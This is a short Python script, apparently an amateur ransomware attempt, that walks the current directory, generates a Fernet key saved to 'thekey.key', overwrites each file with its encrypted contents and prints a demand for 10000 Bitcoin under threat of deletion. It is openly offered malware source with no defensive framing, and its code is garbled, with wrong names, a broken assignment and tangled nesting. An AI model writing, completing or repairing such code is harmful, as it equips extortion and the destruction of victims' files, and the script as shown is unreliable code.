import os
from cryptography.fernet import fernet
#lets find some files
files=[]
for file in os.listdir():
    if files=="Ramsoware.py":
        continue
    if os.path.isfile(file):
        files.append(file)
        print(files)

        key=fernet.generate_key()
        with open("thekey.key","wb") as thekey:
            thekey.write(key)
            for file in files:
                with open(file,"rb") as thefile:
                    
                    contents =thefile.read()
                    contents_encrypted +fernet(key).encrypted(contents)
                    with open (file,"wb") as thefile:
                        thefile.write(contents_encrypted)
                        print("All your files have been encrypted!! send me 10000 Bitcoin or I'll delete them in 24hrs.")